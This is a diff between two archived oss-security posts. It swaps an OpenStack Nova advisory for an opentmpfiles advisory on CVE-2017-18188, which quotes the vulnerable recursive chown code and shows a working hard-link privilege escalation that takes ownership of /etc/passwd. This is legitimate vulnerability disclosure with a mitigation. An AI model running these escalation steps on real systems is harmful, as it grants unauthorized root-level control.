@@ -1,60 +1,111 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/04/20/3
-Message-Id: <1524234832.jzv1c3sqzc.tristanC@fedora>
-Date: Fri, 20 Apr 2018 14:48:08 +0000
-From: Tristan Cacqueray <tdecacqu@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/02/14/2
+Message-ID: <11bafb9e-8c50-db0b-4640-65ba072e0eaf@orlitzky.com>
+Date: Wed, 14 Feb 2018 16:04:52 -0500
+From: Michael Orlitzky <michael@...itzky.com>
 To: oss-security@...ts.openwall.com
-Subject: [OSSA-2018-001] Raw underlying encrypted volume access (CVE-2017-18191)
+Subject: CVE-2017-18188: opentmpfiles root privilege escalation via recursive chown
 Content-Type: text/plain; charset=utf-8
 
-=====================================================
-OSSA-2018-001: Raw underlying encrypted volume access
-=====================================================
-
-:Date: April 20, 2018
-:CVE: CVE-2017-18191
+Product: opentmpfiles
+Versions-affected: 0.1.3 and earlier (all)
+Author: Michael Orlitzky
+Bug-report: https://github.com/OpenRC/opentmpfiles/issues/3
 
 
-Affects
-~~~~~~~
-- Nova: >=15.0.0 <=15.1.0, >=16.0.0 <=16.1.1
+== Summary ==
+
+The opentmpfiles program implements the tmpfiles.d specification for
+POSIX systems that do not run systemd. When processing a "Z" type entry,
+opentmpfiles calls chown recursively to change ownership of the target
+directory and its contents. An attacker can introduce a hard link into
+that directory pointing to a sensitive file, and the next time that
+opentmpfiles is run, ownership of the hard link's target will be given
+to the attacker.
 
 
-Description
-~~~~~~~~~~~
-Lee Yarwood (Red Hat) reported a vulnerability in Nova encrypted
-volumes handling. By detaching and reattaching an encrypted volume an
-attacker may access the underlying raw volume and corrupt the LUKS
-header resuling in a denial of service attack on the compute host. All
-Nova setups supporting encrypted volumes are affected.
+== Details ==
+
+The specification for the Z-type tmpfiles.d entry implies some type of
+recursive chown:
+
+  Z
+
+  Recursively set the access mode, group and user, and restore the
+  SELinux security context of a file or directory if it exists, as well
+  as of its subdirectories and the files contained therein (if
+  applicable). Lines of this type accept shell-style globs in place of
+  normal path names. Does not follow symlinks.
+
+In opentmpfiles, this is implemented in the "tmpfiles" script:
+
+  _Z() {
+    # Recursively set ownership, access mode and relabel security
+    # context of a path and all its subdirectories (if it is a
+    # directory). Lines of this type accept shell-style globs in
+    # place of normal path names.
+    [ $CREATE -gt 0 ] || return 0
+
+    CHOPTS=-R relabel "$@"
+  }
+
+  relabel() {
+    ...
+    if [ $uid != '-' ]; then
+      dryrun_or_real chown $CHOPTS "$uid" "$path"
+      x=$?
+      if [ $x -ne 0 ]; then
+        status=$x
+      fi
+    fi
+    ...
+  }
+
+  dryrun_or_real() {
+    local dryrun=
+    if [ $DRYRUN -eq 1 ]; then
+      dryrun=echo
+    fi
+    $dryrun "$@"
+  }
+
+Ultimately, the target of the Z-type entry has "chown -R" called on
+it. By default, chown will refuse to follow symlinks when operating
+recursively; however, hard links are another story. Unless some
+(nonstandard) kernel-level protection is enabled, unprivileged users
+are free to create hard links to root-owned files, and chown will
+follow them.
+
+This is straightforward to exploit as the user who owns the target of
+a Z-type entry. Take for example the following tmpfiles.d entry, in
+/etc/tmpfiles.d/exploit.conf:
+
+  d /var/lib/opentmpfiles-exploit 0755 mjo mjo
+  Z /var/lib/opentmpfiles-exploit 0755 mjo mjo
+
+When opentmpfiles is run, ownership of that directory is given to my mjo
+user:
+
+  mjo $ sudo /etc/init.d/opentmpfiles-setup start
+  mjo $ ls -ld /var/lib/opentmpfiles-exploit
+  drwxr-xr-x 2 mjo mjo 4096 Feb 13 18:38 /var/lib/opentmpfiles-exploit
+
+At that point, I'm free to introduce whatever hard links I want,
+
+  mjo $ ln /etc/passwd /var/lib/opentmpfiles-exploit/x
+
+and then restart opentmpfiles (which would happen after a reboot, anyway):
+
+  mjo $ sudo /etc/init.d/opentmpfiles-setup restart
+
+The "chown -R" follows my link, and afterwards I own /etc/passwd:
+
+  mjo $ ls -l /etc/passwd
+  -rwxr-xr-x 2 mjo mjo 1504 Feb 13 19:15 /etc/passwd
 
 
-Patches
-~~~~~~~
-- https://review.openstack.org/561604 (Ocata)
-- https://review.openstack.org/543569 (Pike)
-- https://review.openstack.org/460243 (Queens)
+== Mitigation ==
 
+On Linux, the fs.protected_hardlinks sysctl should be enabled:
 
-Credits
-~~~~~~~
-- Lee Yarwood from Red Hat (CVE-2017-18191)
-
-
-References
-~~~~~~~~~~
-- https://launchpad.net/bugs/1739593
-- http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-18191
-
-
-Notes
-~~~~~
-- Pike and Ocata patches disable encrypted volume swapping, this feature is now
-  only supported in Nova version >= 17.0.0.
-
---
-Tristan Cacqueray
-OpenStack Vulnerability Management Team
-
-
-Content of type "application/pgp-signature" skipped
+  root # sysctl --write fs.protected_hardlinks=1
